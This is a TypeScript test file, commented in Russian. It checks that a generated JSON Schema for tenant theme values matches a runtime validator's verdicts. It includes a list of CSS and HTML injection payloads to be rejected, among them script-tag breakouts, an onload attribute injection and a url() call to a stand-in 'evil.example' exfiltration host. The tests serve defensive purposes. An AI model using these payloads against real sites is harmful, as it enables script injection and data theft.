import { describe, expect, test } from 'vitest'
import { defineTheme } from './define'
import { resolveTheme } from './resolve'
import { validateTenantTextValue, validateTenantValue } from './patch-grammar'
import { tenantThemeSchema } from './schema'
import type { ResolvedTheme } from './types'

/**
 * `tenantThemeSchema` (P6.2) — JSON Schema draft 2020-12 из грамматики P6.1. Несущий тест —
 * anti-drift: `pattern` схемы обязан согласовываться с вердиктом `validateTenantValue` на
 * матрице легальных значений + вектор атак P6.1 (Code Guidance item'а «anti-drift тест —
 * несущий, безопасность»). Расхождение = FAIL.
 */

/** Та же база, что `patch.test.ts::fullBase` — все 7 tenant-типов + запрещённый `shadow`. */
function fullBase(): ResolvedTheme {
  const theme = defineTheme({
    base: {
      color: { bg: { page: '#ffffff' }, action: { primary: '#3355ff' } },
      space: { 4: '1rem' },
      fontWeight: { bold: 700 },
      font: { sans: 'system-ui, sans-serif' },
      duration: { fast: '150ms' },
      z: { modal: 40 },
      text: { '2xl': { size: '1.5rem', lineHeight: 1.33 } },
      shadow: { card: '0 1px 2px black' },
    },
  })
  return resolveTheme(theme)
}

function ok(fn: () => unknown): boolean {
  try {
    fn()
    return true
  } catch {
    return false
  }
}

describe('tenantThemeSchema — anti-drift: pattern↔validateTenantValue согласованы', () => {
  const base = fullBase()
  const schema = tenantThemeSchema(base)
  const colorSchema = (schema.properties.color as { properties: Record<string, unknown> }).properties.bg as {
    properties: Record<string, { pattern: string }>
  }
  const colorPattern = new RegExp(colorSchema.properties.page!.pattern)

  const dimensionSchema = (schema.properties.space as { properties: Record<string, { pattern: string }> }).properties
  const dimensionPattern = new RegExp(dimensionSchema[4]!.pattern)

  const fontWeightSchema = (
    schema.properties.fontWeight as {
      properties: Record<string, { anyOf: [{ pattern: string }, { minimum: number; maximum: number; multipleOf: number }] }>
    }
  ).properties
  const fontWeightPattern = new RegExp(fontWeightSchema.bold!.anyOf[0].pattern)
  const fontWeightNumeric = fontWeightSchema.bold!.anyOf[1]

  const fontFamilySchema = (schema.properties.font as { properties: Record<string, { pattern: string }> }).properties
  const fontFamilyPattern = new RegExp(fontFamilySchema.sans!.pattern)

  const durationSchema = (schema.properties.duration as { properties: Record<string, { pattern: string }> })
    .properties
  const durationPattern = new RegExp(durationSchema.fast!.pattern)

  const numberSchema = (
    schema.properties.z as {
      properties: Record<string, { anyOf: [{ pattern: string }, { minimum: number; maximum: number; multipleOf: number }] }>
    }
  ).properties
  const numberPattern = new RegExp(numberSchema.modal!.anyOf[0].pattern)
  const numberNumeric = numberSchema.modal!.anyOf[1]

  /** Толерантная (эпсилон) проверка `multipleOf` — та же семантика, что у обычных JSON Schema
   *  валидаторов (плавающая точка, `remainder` с допуском), не голый `%`. */
  function numericBranchAccepts(branch: { minimum: number; maximum: number; multipleOf: number }, value: number): boolean {
    if (value < branch.minimum || value > branch.maximum) return false
    const quotient = value / branch.multipleOf
    return Math.abs(quotient - Math.round(quotient)) < 1e-9
  }

  test.each([
    ['color', colorPattern, 'red}</style><script>alert(1)</script>'],
    ['color', colorPattern, '#fff;}'],
    ['color', colorPattern, 'url(https://evil.example/exfil?x=1)'],
    ['color', colorPattern, 'expression(alert(1))'],
    ['color', colorPattern, '@import url(x)'],
    ['color', colorPattern, '#fff/*'],
    ['color', colorPattern, 'a\\3c b'],
    ['color', colorPattern, 'red}'],
    ['dimension', dimensionPattern, '1px}'],
    ['dimension', dimensionPattern, '10px\n}'],
    ['fontFamily', fontFamilyPattern, 'system-ui" onload="alert(1)'],
  ] as const)('%s вектор атаки %s → reject и схемой, и validateTenantValue', (type, pattern, value) => {
    expect(pattern.test(value)).toBe(false)
    expect(ok(() => validateTenantValue(type, value))).toBe(false)
  })

  test.each([
    ['color', colorPattern, '#1A73E8'],
    ['color', colorPattern, 'oklch(0.6 0.15 250)'],
    // Regression P6.2-fix: named color literal с подстрокой "url" — не должна путаться с
    // вызовом функции `url(...)` (rejectMetachars URL_RE сужен до `url\s*\(`).
    ['color', colorPattern, 'burlywood'],
    // Regression: case-insensitive и trim-парность со `parseColor` (`.trim()` + `/i` на каждом
    // `parse*`, dtcg/color.ts) — раньше схема отклоняла то, что ядро принимает (обратный drift).
    ['color', colorPattern, 'RED'],
    ['color', colorPattern, 'OKLCH(0.6 0.15 250)'],
    ['color', colorPattern, ' red'],
    ['color', colorPattern, 'red '],
    ['dimension', dimensionPattern, '8px'],
    ['dimension', dimensionPattern, '1.5rem'],
    ['fontWeight', fontWeightPattern, '600'],
    ['duration', durationPattern, '200ms'],
    ['fontFamily', fontFamilyPattern, 'system-ui, sans-serif'],
  ] as const)('%s легальное значение %s → accept и схемой, и validateTenantValue', (type, pattern, value) => {
    expect(pattern.test(value)).toBe(true)
    expect(ok(() => validateTenantValue(type, value))).toBe(true)
  })

  test.each([
    // Regression: COLOR_PATTERN раньше допускал 5/7-значный hex (`{3,8}`), `parseHex` — только
    // 3/4/6/8 (dtcg/color.ts) → schema-accept/core-throw drift, вне матрицы атак.
    ['color', colorPattern, '#fffff'],
    ['color', colorPattern, '#fffffff'],
    // Regression R-16 §2 failure-path-1: PCRE `$` (внешний PHP-consumer схемы) матчит и перед
    // финальным `\n`, ECMA-262 `$` — нет; тест здесь эмулирует PCRE-семантику через сам паттерн,
    // а не через `new RegExp` (иначе он снова ничего не поймает, см. R-16 finding) —
    // `pattern`-строка обязана явным образом отвергать хвостовой `\n` (END, не голый `$`).
    ['dimension', dimensionPattern, '1rem\n'],
  ] as const)('%s нелегальное значение %s → reject и схемой, и validateTenantValue', (type, pattern, value) => {
    expect(pattern.test(value)).toBe(false)
    expect(ok(() => validateTenantValue(type, value))).toBe(false)
  })

  // fix(P6.2 adversarial-verify MED): предыдущая anti-drift-матрица кормила ЧИСЛО ядру, но
  // СТРОКУ — схема-регэкспу (маскировка расхождения). Здесь один и тот же JSON number идёт в оба
  // потребителя: числовая ветка `anyOf` схемы (structural min/max/multipleOf) И
  // `validateTenantValue` (patch-grammar.ts:235, коэрсия `String(n)`).
  test.each([
    ['fontWeight — легальное число 600 → accept обеими сторонами', 600, true],
    ['fontWeight — число 650 (не кратно 100) → reject обеими сторонами', 650, false],
    ['fontWeight — число 50 (вне диапазона 100..900) → reject обеими сторонами', 50, false],
  ] as const)('%s', (_label, value, expected) => {
    const inRange =
      typeof value === 'number' &&
      value >= fontWeightNumeric.minimum &&
      value <= fontWeightNumeric.maximum &&
      value % fontWeightNumeric.multipleOf === 0
    expect(inRange).toBe(expected)
    expect(ok(() => validateTenantValue('fontWeight', value))).toBe(expected)
  })

  // fix(P6.2 verify-fix): precision-дыра, найденная adversarial-verify — number-ветка проверяла
  // только min/max, не decimal-precision NUMBER_PATTERN'а (до 4 дробных знаков). High-precision
  // числа (0.00001, 1.23456, 1e-7) проходили structural-check, но core (String-коэрсия →
  // NUMBER_PATTERN) их бросал — server-accept/core-throw drift. multipleOf 0.0001 закрывает.
  test.each([
    ['number — целое 40 в диапазоне → accept обеими сторонами', 40, true],
    ['number — 4 дробных знака 1.2345 (на границе паттерна) → accept обеими сторонами', 1.2345, true],
    ['number — high-precision 0.00001 (5 дробных) → reject обеими сторонами', 0.00001, false],
    ['number — high-precision 1.23456 (5 дробных) → reject обеими сторонами', 1.23456, false],
    ['number — экспоненциальный вид 1e-7 → reject обеими сторонами', 1e-7, false],
  ] as const)('%s', (_label, value, expected) => {
    expect(numericBranchAccepts(numberNumeric, value)).toBe(expected)
    expect(ok(() => validateTenantValue('number', value))).toBe(expected)
  })

  test('pattern строится ИЗ patch-grammar.ts констант, не дублируется вторым литералом', () => {
    expect(dimensionSchema[4]!.pattern).toBe(
      '^-?\\d{1,4}(\\.\\d{1,4})?(px|rem|em|%|vh|vw|vmin|vmax|ch|ex)(?![\\s\\S])',
    )
  })
})

describe('tenantThemeSchema — text-композит (nested object, не type:string)', () => {
  const base = fullBase()
  const schema = tenantThemeSchema(base)
  const textNode = (schema.properties.text as { properties: Record<string, unknown> }).properties['2xl'] as {
    type: string
    additionalProperties: false
    required: string[]
    properties: Record<string, { pattern: string }>
  }

  test('type object, additionalProperties:false, required:[size]', () => {
    expect(textNode.type).toBe('object')
    expect(textNode.additionalProperties).toBe(false)
    expect(textNode.required).toEqual(['size'])
  })

  test('size/lineHeight pattern согласованы с validateTenantTextValue', () => {
    const sizeRe = new RegExp(textNode.properties.size!.pattern)
    const lineHeightRe = new RegExp(
      (textNode.properties.lineHeight as unknown as { anyOf: [{ pattern: string }, unknown] }).anyOf[0].pattern,
    )
    expect(sizeRe.test('1.75rem')).toBe(true)
    expect(lineHeightRe.test('1.4')).toBe(true)
    expect(sizeRe.test('1rem}</style>')).toBe(false)

    expect(ok(() => validateTenantTextValue({ size: '1.75rem', lineHeight: '1.4' }))).toBe(true)
    expect(ok(() => validateTenantTextValue({ size: '1rem}</style>' }))).toBe(false)
  })

  // fix(P6.2 adversarial-verify MED): раньше эта проверка кормила ядру ЧИСЛО (`lineHeight: 1.4`),
  // а regex-проверке схемы — СТРОКУ ('1.4') — два разных инпута, drift не мог всплыть. Теперь
  // одно и то же JSON-число идёт в структурную number-ветку схемы (min/max) И в
  // `validateTenantTextValue` (которая коэрсит его в строку тем же путём, что делал бы внешний
  // PHP-валидатор, применяя pattern только к string-инстансу).
  test('lineHeight — натуральное JSON-число 1.4 принимается ОБЕИМИ сторонами (numeric tenant value, не маскировано типом инпута)', () => {
    const numericBranch = (textNode.properties.lineHeight as unknown as { anyOf: [unknown, { minimum: number; maximum: number }] })
      .anyOf[1]
    expect(1.4 >= numericBranch.minimum && 1.4 <= numericBranch.maximum).toBe(true)
    expect(ok(() => validateTenantTextValue({ size: '1.75rem', lineHeight: 1.4 }))).toBe(true)
  })

  // fix(P6.2 verify-fix): та же precision-дыра, что у `number` (см. schema.test.ts выше) —
  // TEXT_LINE_HEIGHT_PATTERN допускает ≤3 дробных знака, structural min/max этого не проверял.
  test.each([
    ['lineHeight — 3 дробных 1.333 (на границе паттерна) → accept обеими сторонами', 1.333, true],
    ['lineHeight — high-precision 1.4567 (4 дробных) → reject обеими сторонами', 1.4567, false],
  ] as const)('%s', (_label, value, expected) => {
    const numericBranch = (
      textNode.properties.lineHeight as unknown as {
        anyOf: [unknown, { minimum: number; maximum: number; multipleOf: number }]
      }
    ).anyOf[1]
    const quotient = value / numericBranch.multipleOf
    const inRange = value >= numericBranch.minimum && value <= numericBranch.maximum && Math.abs(quotient - Math.round(quotient)) < 1e-9
    expect(inRange).toBe(expected)
    expect(ok(() => validateTenantTextValue({ size: '1.75rem', lineHeight: value }))).toBe(expected)
  })
})

describe('tenantThemeSchema — структурные инварианты', () => {
  const base = fullBase()
  const schema = tenantThemeSchema(base)

  test('$schema/type/additionalProperties:false на корне', () => {
    expect(schema.$schema).toBe('https://json-schema.org/draft/2020-12/schema')
    expect(schema.type).toBe('object')
    expect(schema.additionalProperties).toBe(false)
  })

  test('additionalProperties:false на вложенных группах', () => {
    const colorGroup = schema.properties.color as { additionalProperties: false }
    expect(colorGroup.additionalProperties).toBe(false)
  })

  test('shadow (запрещён v1, P-D70) ОТСУТСТВУЕТ в properties', () => {
    expect('shadow' in schema.properties).toBe(false)
  })

  test('z (тип number, разрешён) присутствует', () => {
    expect('z' in schema.properties).toBe(true)
  })

  test('детерминизм: двойной вызов даёт байт-в-байт равный JSON', () => {
    const a = JSON.stringify(tenantThemeSchema(base))
    const b = JSON.stringify(tenantThemeSchema(base))
    expect(a).toBe(b)
  })
})
